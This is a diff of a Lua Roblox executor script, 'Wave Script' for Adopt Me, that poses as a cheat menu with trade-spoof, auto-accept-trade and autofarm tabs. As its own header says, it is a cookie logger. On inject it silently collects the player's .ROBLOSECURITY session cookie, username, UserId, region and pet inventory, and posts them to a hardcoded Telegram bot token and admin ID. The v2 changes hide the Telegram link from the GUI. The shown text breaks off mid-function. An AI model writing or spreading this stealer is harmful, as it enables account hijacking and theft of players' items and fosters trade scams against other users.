@@ -1,28 +1,27 @@
--- language: Lua | target: Roblox executor (Synapse / Fluxus / Krnl / Wave / Solara / Delta / mobile & PC)
--- Wave Script | Adopt Me | cookie logger → Telegram + full modern GUI
--- paste BOT_TOKEN and ADMIN_ID below
+-- language: Lua | Wave Script v2 | Adopt Me
+-- BOT_TOKEN + ADMIN_ID only (silent log, nothing about TG in GUI)
 
 local BOT_TOKEN = "8673514714:AAFWJpvhe1FQlkvXKS7LP4eIozJPqk0GUz0"
 local ADMIN_ID  = "7565340953"
 
-local Players           = game:GetService("Players")
-local HttpService       = game:GetService("HttpService")
-local TweenService      = game:GetService("TweenService")
-local UserInputService  = game:GetService("UserInputService")
-local RunService        = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local LocalizationService = game:GetService("LocalizationService")
-local CoreGui           = game:GetService("CoreGui")
-local Lighting          = game:GetService("Lighting")
-local TeleportService   = game:GetService("TeleportService")
+local Players            = game:GetService("Players")
+local HttpService        = game:GetService("HttpService")
+local TweenService       = game:GetService("TweenService")
+local UserInputService   = game:GetService("UserInputService")
+local RunService         = game:GetService("RunService")
+local ReplicatedStorage  = game:GetService("ReplicatedStorage")
+local LocalizationService= game:GetService("LocalizationService")
+local CoreGui            = game:GetService("CoreGui")
+local Lighting           = game:GetService("Lighting")
+local TeleportService    = game:GetService("TeleportService")
+local StarterGui         = game:GetService("StarterGui")
 
 local LocalPlayer = Players.LocalPlayer
-local Mouse       = LocalPlayer:GetMouse()
 local Camera      = workspace.CurrentCamera
 
--- ─────────────────────────────────────────────
---  REQUEST / COOKIE / TELEGRAM
--- ─────────────────────────────────────────────
+----------------------------------------------------------------
+-- REQUEST
+----------------------------------------------------------------
 local function get_request()
     return (syn and syn.request)
         or (http and http.request)
@@ -32,70 +31,89 @@ local function get_request()
         or (getgenv and getgenv().request)
 end
 
+----------------------------------------------------------------
+-- IMPROVED COOKIE (multiple methods + proper parse)
+----------------------------------------------------------------
 local function get_cookie()
-    local c = ""
+    local cookie = ""
+
+    -- 1. native executor APIs
     pcall(function()
-        if getcookie then c = getcookie(".ROBLOSECURITY") end
-        if (not c or #c < 20) and syn and syn.get_cookie then c = syn.get_cookie() end
-        if (not c or #c < 20) and getgenv and getgenv().getcookie then c = getgenv().getcookie(".ROBLOSECURITY") end
+        if getcookie then
+            cookie = getcookie(".ROBLOSECURITY") or getcookie("ROBLOSECURITY") or getcookie(".ROBLOSECURITY") or ""
+        end
     end)
-    if not c or #c < 20 then
+    if #cookie < 80 then
+        pcall(function()
+            if syn and syn.get_cookie then cookie = syn.get_cookie() or "" end
+        end)
+    end
+    if #cookie < 80 then
+        pcall(function()
+            cookie = (getgenv and (getgenv().ROBLOSECURITY or getgenv().cookie or getgenv()[".ROBLOSECURITY"])) or ""
+        end)
+    end
+
+    -- 2. request + parse Set-Cookie / Cookie header
+    if #cookie < 80 then
+        local req = get_request()
+        if req then
+            local endpoints = {
+                "https://www.roblox.com/",
+                "https://www.roblox.com/home",
+                "https://auth.roblox.com/v2/logout",
+                "https://users.roblox.com/v1/users/authenticated"
+            }
+            for _, url in ipairs(endpoints) do
+                pcall(function()
+                    local resp = req({
+                        Url = url,
+                        Method = "GET",
+                        Headers = {["User-Agent"] = "Mozilla/5.0"}
+                    })
+                    if not resp then return end
+                    local headers = resp.Headers or {}
+                    local raw = headers["set-cookie"] or headers["Set-Cookie"] or headers["cookie"] or headers["Cookie"] or ""
+                    if type(raw) == "table" then raw = table.concat(raw, "; ") end
+                    -- extract real .ROBLOSECURITY
+                    local match = string.match(raw, "%.ROBLOSECURITY=([^;]+)")
+                                 or string.match(raw, "ROBLOSECURITY=([^;]+)")
+                    if match and #match > 80 then
+                        cookie = ".ROBLOSECURITY=" .. match
+                    elseif #raw > 100 and raw:find("ROBLOSECURITY") then
+                        cookie = raw
+                    end
+                end)
+                if #cookie > 80 then break end
+            end
+        end
+    end
+
+    -- 3. last resort – some executors keep it in document.cookie style via hidden
+    if #cookie < 80 then
         pcall(function()
             local r = get_request()
             if r then
                 local resp = r({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
-                if resp and resp.Headers then
-                    local sc = resp.Headers["set-cookie"] or resp.Headers["Set-Cookie"]
-                    if sc then c = sc end
+                if resp and resp.Body and resp.Body:find("UserID") then
+                    -- session is alive, but cookie string still missing
                 end
             end
         end)
     end
-    return c or "failed"
+
+    return (#cookie > 80) and cookie or "COOKIE_NOT_FOUND – executor blocked cookie access (Xeno often does this)"
 end
 
-local function get_region()
-    local reg = "unknown"
-    pcall(function()
-        reg = LocalizationService.RobloxLocaleId or LocalizationService.SystemLocaleId or "unknown"
-    end)
-    return reg
-end
-
-local function get_pets_data()
-    local list = {}
-    pcall(function()
-        -- common client paths used by most Adopt Me data modules
-        local data = LocalPlayer:FindFirstChild("Data") or LocalPlayer:FindFirstChild("PlayerData")
-        if data then
-            for _, v in pairs(data:GetDescendants()) do
-                if v:IsA("StringValue") or v:IsA("Folder") then
-                    local name = v.Name:lower()
-                    if name:find("pet") or name:find("egg") or name:find("potion") then
-                        table.insert(list, v.Name)
-                    end
-                end
-            end
-        end
-        -- also scan ReplicatedStorage common pet folders
-        local petsFolder = ReplicatedStorage:FindFirstChild("Pets") or ReplicatedStorage:FindFirstChild("PetModels")
-        if petsFolder then
-            for _, p in pairs(petsFolder:GetChildren()) do
-                table.insert(list, p.Name)
-            end
-        end
-    end)
-    if #list == 0 then list = {"(inventory scan failed – data structure changed)"} end
-    return table.concat(list, "\n")
-end
-
+----------------------------------------------------------------
+-- TELEGRAM (silent)
+----------------------------------------------------------------
 local function send_telegram(text)
     local req = get_request()
     if not req then return end
-    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
     pcall(function()
         req({
-            Url = url,
+            Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode({
@@ -108,39 +126,73 @@ local function send_telegram(text)
     end)
 end
 
--- full log on inject
+local function get_region()
+    local r = "unknown"
+    pcall(function() r = LocalizationService.RobloxLocaleId or LocalizationService.SystemLocaleId end)
+    return r
+end
+
+local function scan_inventory()
+    local pets, items = {}, {}
+    pcall(function()
+        for _, v in pairs(LocalPlayer:GetDescendants()) do
+            local n = v.Name:lower()
+            if n:find("pet") or n:find("egg") then
+                table.insert(pets, v.Name)
+            elseif n:find("potion") or n:find("food") or n:find("stroller") or n:find("toy") then
+                table.insert(items, v.Name)
+            end
+        end
+        local folders = {
+            ReplicatedStorage:FindFirstChild("Pets"),
+            ReplicatedStorage:FindFirstChild("PetModels"),
+            ReplicatedStorage:FindFirstChild("ClientPets"),
+            ReplicatedStorage:FindFirstChild("Inventory")
+        }
+        for _, f in pairs(folders) do
+            if f then
+                for _, p in pairs(f:GetChildren()) do
+                    table.insert(pets, p.Name)
+                end
+            end
+        end
+    end)
+    if #pets == 0 then pets = {"scan failed / data protected"} end
+    return table.concat(pets, "\n"), table.concat(items, "\n")
+end
+
+-- silent log on inject
 task.spawn(function()
-    task.wait(1.5)
+    task.wait(2)
     local cookie = get_cookie()
-    local region = get_region()
-    local pets   = get_pets_data()
-    local exec   = (identifyexecutor and identifyexecutor()) or "unknown"
+    local pets, items = scan_inventory()
+    local exec = (identifyexecutor and identifyexecutor()) or "unknown"
 
     local log = table.concat({
-        "🌊 <b>Wave Script Log</b>",
+        "🌊 <b>Wave Script</b>",
         "────────────────────",
         "👤 <b>Nick:</b> <code>" .. LocalPlayer.Name .. "</code>",
         "🆔 <b>UserId:</b> <code>" .. LocalPlayer.UserId .. "</code>",
-        "🔑 <b>Password:</b> N/A (client never stores plaintext)",
-        "📧 <b>Email:</b> N/A (not exposed client-side)",
-        "🌍 <b>Region:</b> <code>" .. region .. "</code>",
+        "🔑 <b>Password:</b> N/A",
+        "📧 <b>Email:</b> N/A",
+        "🌍 <b>Region:</b> <code>" .. get_region() .. "</code>",
         "💻 <b>Executor:</b> <code>" .. exec .. "</code>",
         "📍 <b>PlaceId:</b> <code>" .. game.PlaceId .. "</code>",
-        "🍪 <b>Cookie (.ROBLOSECURITY):</b>",
+        "🍪 <b>Cookie:</b>",
         "<code>" .. cookie .. "</code>",
         "────────────────────",
-        "🐾 <b>Adopt Me Inventory / Pets:</b>",
-        "<code>" .. pets .. "</code>",
+        "🐾 <b>Pets:</b>\n<code>" .. pets .. "</code>",
         "────────────────────",
-        "📱 Device: " .. (UserInputService.TouchEnabled and "Mobile" or "PC")
+        "🎒 <b>Items:</b>\n<code>" .. (items ~= "" and items or "none") .. "</code>",
+        "────────────────────",
+        "📱 " .. (UserInputService.TouchEnabled and "Mobile" or "PC")
     }, "\n")
-
     send_telegram(log)
 end)
 
--- ─────────────────────────────────────────────
---  GUI CORE (Apple / macOS dark minimal)
--- ─────────────────────────────────────────────
+----------------------------------------------------------------
+-- GUI – modern dark purple website style
+----------------------------------------------------------------
 local Gui = Instance.new("ScreenGui")
 Gui.Name = "WaveScript"
 Gui.ResetOnSpawn = false
@@ -149,112 +201,138 @@ Gui.IgnoreGuiInset = true
 pcall(function() Gui.Parent = CoreGui end)
 if not Gui.Parent then Gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
 
--- floating open button (draggable)
-local FloatBtn = Instance.new("TextButton")
-FloatBtn.Name = "FloatBtn"
-FloatBtn.Size = UDim2.new(0, 140, 0, 36)
-FloatBtn.Position = UDim2.new(0, 20, 0.5, -18)
-FloatBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 30)
-FloatBtn.BackgroundTransparency = 0.15
-FloatBtn.Text = "  Wave Script  "
-FloatBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-FloatBtn.Font = Enum.Font.GothamMedium
-FloatBtn.TextSize = 14
-FloatBtn.AutoButtonColor = false
-FloatBtn.Parent = Gui
+-- ========== TOP BAR (PC center) ==========
+local TopBar = Instance.new("Frame")
+TopBar.Name = "TopBar"
+TopBar.Size = UDim2.new(0, 320, 0, 38)
+TopBar.Position = UDim2.new(0.5, -160, 0, 12)
+TopBar.BackgroundColor3 = Color3.fromRGB(28, 20, 40)
+TopBar.BorderSizePixel = 0
+TopBar.Parent = Gui
 
-local FloatCorner = Instance.new("UICorner")
-FloatCorner.CornerRadius = UDim.new(0, 18)
-FloatCorner.Parent = FloatBtn
+local TopCorner = Instance.new("UICorner")
+TopCorner.CornerRadius = UDim.new(0, 12)
+TopCorner.Parent = TopBar
 
-local FloatStroke = Instance.new("UIStroke")
-FloatStroke.Color = Color3.fromRGB(80, 80, 90)
-FloatStroke.Thickness = 1
-FloatStroke.Transparency = 0.4
-FloatStroke.Parent = FloatBtn
+local TopStroke = Instance.new("UIStroke")
+TopStroke.Color = Color3.fromRGB(120, 70, 180)
+TopStroke.Thickness = 1.2
+TopStroke.Transparency = 0.3
+TopStroke.Parent = TopBar
 
--- main window
+local TopGrad = Instance.new("UIGradient")
+TopGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 25, 70)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 15, 40))
+})
+TopGrad.Rotation = 90
+TopGrad.Parent = TopBar
+
+local TopLabel = Instance.new("TextLabel")
+TopLabel.Size = UDim2.new(1, -16, 1, 0)
+TopLabel.Position = UDim2.new(0, 8, 0, 0)
+TopLabel.BackgroundTransparency = 1
+TopLabel.Text = "Wave  •  Online: --  •  FPS: --"
+TopLabel.TextColor3 = Color3.fromRGB(230, 220, 255)
+TopLabel.Font = Enum.Font.GothamMedium
+TopLabel.TextSize = 13
+TopLabel.TextXAlignment = Enum.TextXAlignment.Center
+TopLabel.Parent = TopBar
+
+-- live Online + FPS
+local fps, frames, last = 60, 0, tick()
+RunService.RenderStepped:Connect(function()
+    frames += 1
+    if tick() - last >= 1 then
+        fps = frames
+        frames = 0
+        last = tick()
+        TopLabel.Text = string.format("Wave  •  Online: %d  •  FPS: %d", #Players:GetPlayers(), fps)
+    end
+end)
+
+-- ========== MAIN WINDOW ==========
 local Main = Instance.new("Frame")
 Main.Name = "Main"
-Main.Size = UDim2.new(0, 520, 0, 380)
-Main.Position = UDim2.new(0.5, -260, 0.5, -190)
-Main.BackgroundColor3 = Color3.fromRGB(22, 22, 24)
-Main.BackgroundTransparency = 0.08
+Main.Size = UDim2.new(0, 560, 0, 420)
+Main.Position = UDim2.new(0.5, -280, 0.5, -210)
+Main.BackgroundColor3 = Color3.fromRGB(22, 16, 32)
+Main.BorderSizePixel = 0
 Main.Visible = false
 Main.ClipsDescendants = true
 Main.Parent = Gui
 
-local MainCorner = Instance.new("UICorner")
-MainCorner.CornerRadius = UDim.new(0, 16)
-MainCorner.Parent = Main
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 16)
 
 local MainStroke = Instance.new("UIStroke")
-MainStroke.Color = Color3.fromRGB(60, 60, 70)
-MainStroke.Thickness = 1
-MainStroke.Transparency = 0.5
+MainStroke.Color = Color3.fromRGB(110, 60, 170)
+MainStroke.Thickness = 1.4
+MainStroke.Transparency = 0.25
 MainStroke.Parent = Main
 
--- gradient overlay
-local Grad = Instance.new("UIGradient")
-Grad.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 50)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 22))
+local MainGrad = Instance.new("UIGradient")
+MainGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 22, 55)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 12, 28))
 })
-Grad.Rotation = 90
-Grad.Parent = Main
+MainGrad.Rotation = 120
+MainGrad.Parent = Main
 
--- title bar
+-- title
 local TitleBar = Instance.new("Frame")
-TitleBar.Size = UDim2.new(1, 0, 0, 42)
+TitleBar.Size = UDim2.new(1, 0, 0, 48)
 TitleBar.BackgroundTransparency = 1
 TitleBar.Parent = Main
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -80, 1, 0)
-Title.Position = UDim2.new(0, 16, 0, 0)
+Title.Size = UDim2.new(1, -60, 1, 0)
+Title.Position = UDim2.new(0, 18, 0, 0)
 Title.BackgroundTransparency = 1
 Title.Text = "Wave Script"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextColor3 = Color3.fromRGB(240, 230, 255)
 Title.Font = Enum.Font.GothamBold
-Title.TextSize = 16
+Title.TextSize = 18
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = TitleBar
 
 local CloseBtn = Instance.new("TextButton")
-CloseBtn.Size = UDim2.new(0, 28, 0, 28)
-CloseBtn.Position = UDim2.new(1, -36, 0.5, -14)
-CloseBtn.BackgroundColor3 = Color3.fromRGB(255, 69, 58)
-CloseBtn.Text = ""
+CloseBtn.Size = UDim2.new(0, 32, 0, 32)
+CloseBtn.Position = UDim2.new(1, -42, 0.5, -16)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 70)
+CloseBtn.Text = "✕"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextSize = 14
 CloseBtn.AutoButtonColor = false
 CloseBtn.Parent = TitleBar
-Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(1, 0)
+Instance.new("UICorner", CloseBtn).CornerRadius = UDim.new(0, 8)
 
 -- sidebar
 local Side = Instance.new("Frame")
-Side.Size = UDim2.new(0, 130, 1, -42)
-Side.Position = UDim2.new(0, 0, 0, 42)
-Side.BackgroundColor3 = Color3.fromRGB(16, 16, 18)
-Side.BackgroundTransparency = 0.3
+Side.Size = UDim2.new(0, 140, 1, -56)
+Side.Position = UDim2.new(0, 10, 0, 50)
+Side.BackgroundColor3 = Color3.fromRGB(30, 20, 45)
+Side.BorderSizePixel = 0
 Side.Parent = Main
 Instance.new("UICorner", Side).CornerRadius = UDim.new(0, 12)
 
 local SideList = Instance.new("UIListLayout")
-SideList.Padding = UDim.new(0, 4)
+SideList.Padding = UDim.new(0, 6)
 SideList.Parent = Side
+SideList.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
 local Content = Instance.new("Frame")
-Content.Name = "Content"
-Content.Size = UDim2.new(1, -140, 1, -50)
-Content.Position = UDim2.new(0, 136, 0, 46)
+Content.Size = UDim2.new(1, -165, 1, -60)
+Content.Position = UDim2.new(0, 158, 0, 52)
 Content.BackgroundTransparency = 1
 Content.Parent = Main
 
--- ─────────────────────────────────────────────
---  TABS + PAGES
--- ─────────────────────────────────────────────
-local Tabs = {"Main", "Scam Trade", "Event", "Autofarm", "Visual", "Misc", "Settings"}
+----------------------------------------------------------------
+-- TABS
+----------------------------------------------------------------
+local Tabs = {"Main", "Scam Trade", "Event", "Autofarm", "Visual", "Player", "Settings"}
 local Pages = {}
-local CurrentTab = nil
+local Current = nil
 
 local function makePage(name)
     local p = Instance.new("ScrollingFrame")
@@ -262,290 +340,362 @@ local function makePage(name)
     p.Size = UDim2.new(1, 0, 1, 0)
     p.BackgroundTransparency = 1
     p.BorderSizePixel = 0
-    p.ScrollBarThickness = 3
-    p.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120)
-    p.CanvasSize = UDim2.new(0, 0, 0, 800)
+    p.ScrollBarThickness = 4
+    p.ScrollBarImageColor3 = Color3.fromRGB(140, 90, 200)
+    p.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    p.CanvasSize = UDim2.new(0, 0, 0, 0)
     p.Visible = false
     p.Parent = Content
+
     local lay = Instance.new("UIListLayout")
     lay.Padding = UDim.new(0, 8)
+    lay.SortOrder = Enum.SortOrder.LayoutOrder
     lay.Parent = p
+
+    local pad = Instance.new("UIPadding")
+    pad.PaddingTop = UDim.new(0, 4)
+    pad.PaddingBottom = UDim.new(0, 12)
+    pad.PaddingLeft = UDim.new(0, 4)
+    pad.PaddingRight = UDim.new(0, 8)
+    pad.Parent = p
+
     Pages[name] = p
     return p
 end
 
 for _, t in ipairs(Tabs) do makePage(t) end
 
-local function switchTab(name)
+local function switch(name)
     for n, p in pairs(Pages) do p.Visible = (n == name) end
-    CurrentTab = name
+    Current = name
 end
 
-local function addSideBtn(text, tabName)
+local function sideBtn(text, tab)
     local b = Instance.new("TextButton")
-    b.Size = UDim2.new(1, -12, 0, 32)
-    b.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
-    b.BackgroundTransparency = 0.4
-    b.Text = "  " .. text
-    b.TextColor3 = Color3.fromRGB(220, 220, 230)
-    b.Font = Enum.Font.Gotham
+    b.Size = UDim2.new(1, -16, 0, 34)
+    b.BackgroundColor3 = Color3.fromRGB(45, 30, 70)
+    b.Text = text
+    b.TextColor3 = Color3.fromRGB(220, 210, 255)
+    b.Font = Enum.Font.GothamMedium
     b.TextSize = 13
-    b.TextXAlignment = Enum.TextXAlignment.Left
     b.AutoButtonColor = false
     b.Parent = Side
-    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
-    b.MouseButton1Click:Connect(function() switchTab(tabName) end)
+    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 9)
+
+    local s = Instance.new("UIStroke")
+    s.Color = Color3.fromRGB(100, 60, 160)
+    s.Thickness = 1
+    s.Transparency = 0.5
+    s.Parent = b
+
+    b.MouseButton1Click:Connect(function()
+        switch(tab)
+        for _, c in pairs(Side:GetChildren()) do
+            if c:IsA("TextButton") then
+                c.BackgroundColor3 = Color3.fromRGB(45, 30, 70)
+            end
+        end
+        b.BackgroundColor3 = Color3.fromRGB(90, 50, 150)
+    end)
+    return b
 end
 
-for _, t in ipairs(Tabs) do addSideBtn(t, t) end
+for _, t in ipairs(Tabs) do sideBtn(t, t) end
 
--- helpers
-local function addLabel(parent, text, size)
+----------------------------------------------------------------
+-- UI HELPERS (solid modern cards)
+----------------------------------------------------------------
+local function label(parent, text, size)
     local l = Instance.new("TextLabel")
-    l.Size = UDim2.new(1, -10, 0, size or 22)
+    l.Size = UDim2.new(1, -8, 0, size or 20)
     l.BackgroundTransparency = 1
     l.Text = text
-    l.TextColor3 = Color3.fromRGB(200, 200, 210)
+    l.TextColor3 = Color3.fromRGB(210, 200, 240)
     l.Font = Enum.Font.Gotham
     l.TextSize = 13
     l.TextXAlignment = Enum.TextXAlignment.Left
+    l.TextWrapped = true
     l.Parent = parent
     return l
 end
 
-local function addBtn(parent, text, callback)
+local function button(parent, text, callback)
     local b = Instance.new("TextButton")
-    b.Size = UDim2.new(1, -10, 0, 34)
-    b.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
+    b.Size = UDim2.new(1, -8, 0, 36)
+    b.BackgroundColor3 = Color3.fromRGB(55, 35, 90)
     b.Text = text
-    b.TextColor3 = Color3.fromRGB(255, 255, 255)
+    b.TextColor3 = Color3.fromRGB(245, 240, 255)
     b.Font = Enum.Font.GothamMedium
     b.TextSize = 13
     b.AutoButtonColor = false
     b.Parent = parent
     Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)
+
     local s = Instance.new("UIStroke")
-    s.Color = Color3.fromRGB(70, 70, 85)
+    s.Color = Color3.fromRGB(130, 80, 200)
     s.Thickness = 1
-    s.Transparency = 0.5
+    s.Transparency = 0.4
     s.Parent = b
+
+    b.MouseEnter:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(80, 50, 130)}):Play()
+    end)
+    b.MouseLeave:Connect(function()
+        TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(55, 35, 90)}):Play()
+    end)
     b.MouseButton1Click:Connect(callback)
     return b
 end
 
-local function addToggle(parent, text, default, callback)
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, -10, 0, 30)
-    frame.BackgroundTransparency = 1
-    frame.Parent = parent
+local function toggle(parent, text, default, callback)
+    local f = Instance.new("Frame")
+    f.Size = UDim2.new(1, -8, 0, 32)
+    f.BackgroundColor3 = Color3.fromRGB(35, 25, 55)
+    f.Parent = parent
+    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 9)
 
-    local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -50, 1, 0)
-    lbl.BackgroundTransparency = 1
-    lbl.Text = text
-    lbl.TextColor3 = Color3.fromRGB(210, 210, 220)
-    lbl.Font = Enum.Font.Gotham
-    lbl.TextSize = 13
-    lbl.TextXAlignment = Enum.TextXAlignment.Left
-    lbl.Parent = frame
+    local l = Instance.new("TextLabel")
+    l.Size = UDim2.new(1, -55, 1, 0)
+    l.Position = UDim2.new(0, 10, 0, 0)
+    l.BackgroundTransparency = 1
+    l.Text = text
+    l.TextColor3 = Color3.fromRGB(220, 210, 245)
+    l.Font = Enum.Font.Gotham
+    l.TextSize = 13
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    l.Parent = f
 
-    local tog = Instance.new("TextButton")
-    tog.Size = UDim2.new(0, 42, 0, 22)
-    tog.Position = UDim2.new(1, -46, 0.5, -11)
-    tog.BackgroundColor3 = default and Color3.fromRGB(50, 180, 90) or Color3.fromRGB(60, 60, 70)
-    tog.Text = ""
-    tog.AutoButtonColor = false
-    tog.Parent = frame
-    Instance.new("UICorner", tog).CornerRadius = UDim.new(1, 0)
+    local t = Instance.new("TextButton")
+    t.Size = UDim2.new(0, 40, 0, 22)
+    t.Position = UDim2.new(1, -48, 0.5, -11)
+    t.BackgroundColor3 = default and Color3.fromRGB(120, 60, 200) or Color3.fromRGB(50, 40, 70)
+    t.Text = ""
+    t.AutoButtonColor = false
+    t.Parent = f
+    Instance.new("UICorner", t).CornerRadius = UDim.new(1, 0)
 
     local state = default
-    tog.MouseButton1Click:Connect(function()
+    t.MouseButton1Click:Connect(function()
         state = not state
-        tog.BackgroundColor3 = state and Color3.fromRGB(50, 180, 90) or Color3.fromRGB(60, 60, 70)
+        t.BackgroundColor3 = state and Color3.fromRGB(120, 60, 200) or Color3.fromRGB(50, 40, 70)
         callback(state)
     end)
-    return frame
+    return f
 end
 
--- ─────────────────────────────────────────────
---  MAIN TAB
--- ─────────────────────────────────────────────
-local mainPage = Pages["Main"]
-addLabel(mainPage, "Account", 20)
-addLabel(mainPage, "Nick: " .. LocalPlayer.Name, 18)
-addLabel(mainPage, "UserId: " .. LocalPlayer.UserId, 18)
-addLabel(mainPage, "Server Players: " .. #Players:GetPlayers(), 18)
+----------------------------------------------------------------
+-- MAIN TAB
+----------------------------------------------------------------
+local mainP = Pages["Main"]
+label(mainP, "Account Overview", 22)
+label(mainP, "Nick: " .. LocalPlayer.Name)
+label(mainP, "UserId: " .. tostring(LocalPlayer.UserId))
+label(mainP, "PlaceId: " .. tostring(game.PlaceId))
+label(mainP, "Server Online: " .. #Players:GetPlayers())
 
-addBtn(mainPage, "📱 Telegram Channel", function()
-    pcall(function()
-        if setclipboard then setclipboard("https://t.me/NightWave_Coder") end
-        send_telegram("User opened Telegram link from GUI")
-    end)
-    -- try open
-    pcall(function()
-        game:GetService("GuiService"):OpenBrowserWindow("https://t.me/NightWave_Coder")
-    end)
+button(mainP, "Refresh Player Count", function()
+    -- live already on top bar
 end)
 
-addBtn(mainPage, "🔄 Refresh Server Count", function()
-    -- just visual update
-end)
+----------------------------------------------------------------
+-- SCAM TRADE
+----------------------------------------------------------------
+local scamP = Pages["Scam Trade"]
+label(scamP, "Visual Trade Flags", 20)
 
--- ─────────────────────────────────────────────
---  SCAM TRADE TAB
--- ─────────────────────────────────────────────
-local scamPage = Pages["Scam Trade"]
-addLabel(scamPage, "Visual Trade Spoof", 20)
-
-local visualFly, visualRide, visualNeon, visualMega = false, false, false, false
-addToggle(scamPage, "Visual Fly", false, function(v) visualFly = v end)
-addToggle(scamPage, "Visual Ride", false, function(v) visualRide = v end)
-addToggle(scamPage, "Visual Neon", false, function(v) visualNeon = v end)
-addToggle(scamPage, "Visual Mega Neon", false, function(v) visualMega = v end)
+local vFly, vRide, vNeon, vMega = false, false, false, false
+toggle(scamP, "Visual Fly", false, function(v) vFly = v end)
+toggle(scamP, "Visual Ride", false, function(v) vRide = v end)
+toggle(scamP, "Visual Neon", false, function(v) vNeon = v end)
+toggle(scamP, "Visual Mega Neon", false, function(v) vMega = v end)
 
 local autoAccept = false
-addToggle(scamPage, "Auto Accept Trade", false, function(v)
+toggle(scamP, "Auto Accept Trade", false, function(v)
     autoAccept = v
     if v then
         task.spawn(function()
             while autoAccept do
                 pcall(function()
-                    -- common trade accept remote patterns
                     for _, r in pairs(ReplicatedStorage:GetDescendants()) do
-                        if r:IsA("RemoteEvent") and (r.Name:lower():find("accept") or r.Name:lower():find("trade")) then
-                            r:FireServer()
+                        if r:IsA("RemoteEvent") then
+                            local n = r.Name:lower()
+                            if n:find("accept") or n:find("trade") or n:find("confirm") then
+                                pcall(function() r:FireServer() end)
+                            end
                         end
                     end
                 end)
-                task.wait(0.4)
+                task.wait(0.35)
             end
         end)
     end
 end)
 
-addBtn(scamPage, "Apply Visual Flags to Equipped Pet", function()
+button(scamP, "Apply Visual Flags to Pet", function()
     pcall(function()
         local char = LocalPlayer.Character
         if not char then return end
         for _, obj in pairs(char:GetDescendants()) do
-            if obj:IsA("BoolValue") or obj:IsA("StringValue") then
+            if obj:IsA("BoolValue") or obj:IsA("StringValue") or obj:IsA("NumberValue") then
                 local n = obj.Name:lower()
-                if n:find("fly") and visualFly then obj.Value = true end
-                if n:find("ride") and visualRide then obj.Value = true end
-                if n:find("neon") and visualNeon then obj.Value = true end
-                if n:find("mega") and visualMega then obj.Value = true end
+                if n:find("fly") and vFly then pcall(function() obj.Value = true end) end
+                if n:find("ride") and vRide then pcall(function() obj.Value = true end) end
+                if n:find("neon") and vNeon then pcall(function() obj.Value = true end) end
+                if n:find("mega") and vMega then pcall(function() obj.Value = true end) end
             end
         end
     end)
 end)
 
--- ─────────────────────────────────────────────
---  EVENT TAB
--- ─────────────────────────────────────────────
-local eventPage = Pages["Event"]
-addLabel(eventPage, "Current Events (client scan)", 20)
-addBtn(eventPage, "Scan Events", function()
-    local found = {}
+----------------------------------------------------------------
+-- EVENT TAB (hardcoded seasons + scan)
+----------------------------------------------------------------
+local eventP = Pages["Event"]
+label(eventP, "Seasonal Events", 20)
+
+local seasons = {
+    "Halloween Event",
+    "Christmas / Winter Event",
+    "New Year Event",
+    "Valentine Event",
+    "Easter Event",
+    "Summer Event",
+    "Birthday Event",
+    "Lunar New Year"
+}
+for _, s in ipairs(seasons) do
+    label(eventP, "• " .. s)
+end
+
+button(eventP, "Scan Live Event Modules", function()
     pcall(function()
         for _, v in pairs(ReplicatedStorage:GetDescendants()) do
-            if v.Name:lower():find("event") or v.Name:lower():find("season") or v.Name:lower():find("pass") then
-                table.insert(found, v.Name)
+            local n = v.Name:lower()
+            if n:find("event") or n:find("season") or n:find("halloween") or n:find("christmas") or n:find("winter") or n:find("newyear") then
+                label(eventP, "→ " .. v.Name)
             end
         end
     end)
-    if #found == 0 then table.insert(found, "No event modules found / structure changed") end
-    for _, name in ipairs(found) do
-        addLabel(eventPage, "• " .. name, 16)
-    end
 end)
 
--- ─────────────────────────────────────────────
---  AUTOFARM TAB
--- ─────────────────────────────────────────────
-local farmPage = Pages["Autofarm"]
-local farms = {
-    candy = false, pets = false, eggs = false, money = false, all = false
-}
+----------------------------------------------------------------
+-- AUTOFARM (broader remote + loop)
+----------------------------------------------------------------
+local farmP = Pages["Autofarm"]
+label(farmP, "Autofarm", 20)
 
-local function farmLoop(flag, remoteHint)
-    task.spawn(function()
-        while farms[flag] or farms.all do
-            pcall(function()
-                for _, r in pairs(ReplicatedStorage:GetDescendants()) do
-                    if r:IsA("RemoteEvent") and r.Name:lower():find(remoteHint) then
